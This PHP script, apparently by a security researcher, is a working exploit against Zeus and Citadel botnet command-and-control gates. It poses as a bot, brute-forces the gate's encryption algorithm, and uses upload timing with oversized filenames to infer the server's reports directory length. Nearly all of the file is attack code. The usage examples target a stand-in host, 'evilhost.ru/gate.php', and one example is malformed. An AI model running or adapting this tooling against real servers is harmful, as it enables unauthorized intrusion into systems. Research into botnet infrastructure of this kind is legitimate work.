<?php
#!/usr/bin/php
# coded by Rotem Kerner
# http://www.kerneronsec.com/

require_once 'Zeus.class.php';

define('MAX_FILE_NAME', 176); # considering that the addition of ".dat" to every extensionless filename
define('SAMPLING_CYCLES',100); # how many sampling cycles to preform for every round
define('ALLOWED_NEGATIVE_RESULTS',3); #
define('PLUS_TIME_INTERVAL_THRESHOLD', 50); # in precentage

$args = getopt('u:t::A::B::d:k:', array("login-key::"));

if(!empty($args['t'])){
    $Zbot = Zeus\Zeus_Repository::getByName($args['t']);

    if(!$Zbot){
        print "\n[X] The bot type \'$args[t]\' does not exist using default Zeus client.";
        $Zbot = new Zeus\Zeus();
    }
}
else{
    # using default
    $Zbot = new Zeus\Zeus();
}

if(!empty($args['u'])){
    $Zbot->setGateUrl($args['u']);
}
else{
    print "\n[X] drop point URL must be set";
    usage($argv);
}

$context = array();

if(!empty($args['k'])){
    $context['key'] = $args['k'];

}
else{
     print "\n[X] key must be set";
     usage($argv);
}

if(!empty($args['login-key'])){
    $context["login_key"] = $args['login-key'];
}



$Zbot->setCryptContext($context);



if(!empty($args['d'])){
    $dirs = explode('/', $args['d'], 2);
    if(count($dirs) == 2){
        $Zbot->setBotnetName($dirs[0]);
        $Zbot->setBotId($dirs[1]);
    }
    else{
        $Zbot->setBotnetName($dirs);
    }

}
else{
    $Zbot->setBotId('test4');
    $Zbot->setBotnetName('test');
}

$bruteAlgorithm = false;
if(!empty($args['A'])){
    $algo = Encryption\Encryption_Repository::getByName($args['A']);
    $algo = 'Encryption\Algorithm_Repository\\'.$args['A'];
    if($algo){
        $cryptAlgorithms = array($algo);
    }
    else{
        print "\n[X] specified algorithm $args[A] does not exists please use one of the following:";
        foreach(Encryption\Encryption_Repository::getAll() as $algo){
            print " ". substr(get_class($algo),strrpos(get_class($algo), '\\')+1);
        }
        usage($argv);
    }
   
}
elseif(isset($args['B'])){
    $bruteAlgorithm = true;
    $cryptAlgorithms = Encryption\Encryption_Repository::getAll();
}
else {
    print "\n[X] Encryption algorithm type must be specified using -A option or use -B to try and brute force";
    usage($argv);
}





# brute force algorithms from algorithm repository
for($i = 0 ; $i <= count($cryptAlgorithms); $i++){
    $algoObject = new $cryptAlgorithms[$i]();
    $Zbot->setAlgorithm($algoObject);
    try{
        if($Zbot->uploadFile('test.dat', 'test')){
            print "\n[V] gateway responeded correctly using ".substr(get_class($algoObject),strrpos(get_class($algoObject), '\\')+1)." algorithms";
            break;
        }
    }
    catch(Exception $e){
        if($e->getCode() == ZEUS_EXCEPTION_EMPTY_RESPONSE){
            print "\n[!] received empty response when using ".substr(get_class($algoObject),strrpos(get_class($algoObject), '\\')+1)." algorithms";
            if(count($cryptAlgorithms)-1 == $i){
                print "\n[X] Unable to communicate with the gateway this could be due to one or more of the following:".
                "\n\t * the encryption algorithm is invalid".
                "\n\t * the encryption key is invalid" .
                "\n\t * what you thought is a gateway is nothing but an empty useless page. Doe! X-|\n\n";
                exit(-1);
            }
        }
        elseif($e->getCode() == ZEUS_EXCEPTION_UNEXPECTED_RESPONSE){
            print "\n[X] ".$e->getMessage() ."\n";
            exit(-1);
        }
        elseif($e->getCode() == ZEUS_EXCEPTION_UNABLE_TO_CONNECT){
            print "\n[X] ".$e->getMessage() ."\n";
            exit(-1);
        }
        else {
            print "\n[X] Unhandled exception was thrown by ".substr(get_class($algoObject),strrpos(get_class($algoObject), '\\')+1).': '.$e->getMessage();
        }
    }

}

# new code
###############################################################################
$gotWhatWeCameFor = false;
$longStats = new Statistic();
$shortStats = new Statistic();
$stopper = new Stopper();
while(!$gotWhatWeCameFor){
    for($i = 0; $i <= SAMPLING_CYCLES; $i++){
        # get long delta
        try{
            $stopper->start();
            $Zbot->uploadFile(str_repeat('A', 180). ".dat", str_repeat('A', 9990).rand_str(10));
            $stopper->stop();
            print "\n[L] $i:".$stopper->getDelta();
            $longStats->addVar($stopper->getDelta());

            # get short delta
            $stopper->start();
            $Zbot->uploadFile(rand_str($i) . ".dat", str_repeat('A', 9990).rand_str(10));
            $stopper->stop();
            print "\n[S] $i:".$stopper->getDelta();
            $shortStats->addVar($stopper->getDelta());
        }
        catch(Exception $e){
            $i--;
            print "\n[X] ".$e->getMessage();
        }


    }

    # clean records who are above the standard deviation time and calc average again
    $newVars = array();
    foreach($longStats->getVars() as $var){
        if($var < $longStats->calcAverage() + $longStats->calcStdDeviation()){
            array_push($newVars, $var);
            continue;
        }
        print "\n[!] excluding the value $var from long response time statistics";
    }
    $longStats->setVars($newVars);
    $longDelta = $longStats->calcAverage();
    print "\n[!] statistic for relative-long average time period: $longDelta";
    $longStats->reset();

    $newVars = array();
    foreach($shortStats->getVars() as $var){
        if($var < $shortStats->calcAverage() + $shortStats->calcStdDeviation()){
            array_push($newVars, $var);
            continue;
        }
        print "\n[!] excluding the value $var from short response time statistics";
    }
    $shortStats->setVars($newVars);
    $shortDelta = $shortStats->calcAverage();
    print "\n[!] statistic for relative-short average time period: $shortDelta";
    $shortStats->reset();

    # if short average + 50% short average > long average
    if($shortDelta + ($shortDelta/100) * PLUS_TIME_INTERVAL_THRESHOLD < $longDelta ){
        $negTimeCounter = 0;
        print "\n[V] a satisfying interval has been achieved. moving on to brute forcing the directory length.";
        for($i = MAX_FILE_NAME; $i >= 0; $i--){
            $stopper->start();
            $Zbot->uploadFile(rand_str($i) . '.dat', str_repeat('A', 9990).rand_str(10));
            $stopper->stop();
            $delta = $stopper->getDelta();
            print "\n$i: $delta";

            if(@closest(array($longDelta,$shortDelta), $delta) == $shortDelta){
                #              max - file-len - botid - botnet - "/files///" - ".dat"
                $reportsDirLen = MAX_FILE_NAME - $i - strlen($Zbot->getBotId().$Zbot->getBotnetName()) - 9;
                if($reportsDirLen <= 0){
                    if($negTimeCounter == ALLOWED_NEGATIVE_RESULTS){
                        print "\n[X] The server has excceeded the amount of allowed negative results(".ALLOWED_NEGATIVE_RESULTS.") exploit is probably not effective";
                        exit(-1);
                    }
                    print "\n[!] the resulted dir length has indicated a negative length($reportsDirLen) which is erroneous ";
                    $negTimeCounter++;
                }
                print "\n[V] the reports dir length is $reportsDirLen chars long!\n";
                $gotWhatWeCameFor = true;
                break;

            }
        }
    }

}

exit;



class Stopper{

    private $delta;
    public function start(){
        $this->delta = microtime(true);
    }

    public function stop(){
        $this->delta = microtime(true) - $this->delta;
    }

    public function getDelta(){
        return $this->delta;
    }


}
class Statistic{
    private $vars;

    function  __construct(){
        $this->vars = array();
    }


    public function addVar($x){
        array_push($this->vars, $x);

    }

    public function getVars(){
        return $this->vars;
    }

    public function setVars(array $array){
        $this->vars = $array;
    }

    public function calcAverage(){
        $sum = 0;
        foreach($this->vars as $var){
            $sum += $var;
        }
        return $sum/count($this->vars);
    }

    public function calcStdDeviation(){
        $d = 0;
        foreach($this->vars as $var){
            $d += pow($var - $this->calcAverage(),2);

        }
        return sqrt($d * 1/count($this->vars));

    }

    public function reset(){
        $this->vars = array();
    }
}




function closest($array, $number) {

    array_push($array, $number);
    sort($array,SORT_NUMERIC);
    $key = array_search($number, $array);
    if($array[$key+1] - $array[$key] >= $array[$key] - $array[$key-1] ){
        return $array[$key-1];
    }
    else{
        return $array[$key+1];
    }

}



function rand_str($len){
    return substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',5)),0,$len);
}


function usage($argv){

    print <<<DATA

Usage: $argv[0] -u <drop-url> -k <key> [ -A <algorithm-name> | -B ]  [ -b <botname> -i <botid> ] [-t <client-type>]
    
    -u    - the drop point url address
    -k  - cleartext version of the key for encryption/decryption
    -A    - algorithm name to use as defined in repository
    -B    - try to bruteforce algorithm using all options available in repository
    -t    - use a specific zeus client

    --login-key   - when communicating with a Citadel server this should be used.


optional:
    -d    - the directory inside the reports in which the files will be dropped

Examples:
    $argv[0] -u "http://www.evilhost.ru/gate.php" -k "123 22 76 43 21 09 43 53 100 12 103 [...]" -B
    $argv[0] -u "http://www.evilhost.ru/gate.php" -k "12 135 32 234 44 21 154 163 74 34 [...]" -A RC4_B
    $argv[0] -u "http://www.evilhost.ru/gate.php" -k  -t Citadel"123 22 76 43 21 09 43 53 100 12 103 [...]" -A=RC4_Citadel

DATA;

    exit();
}
?>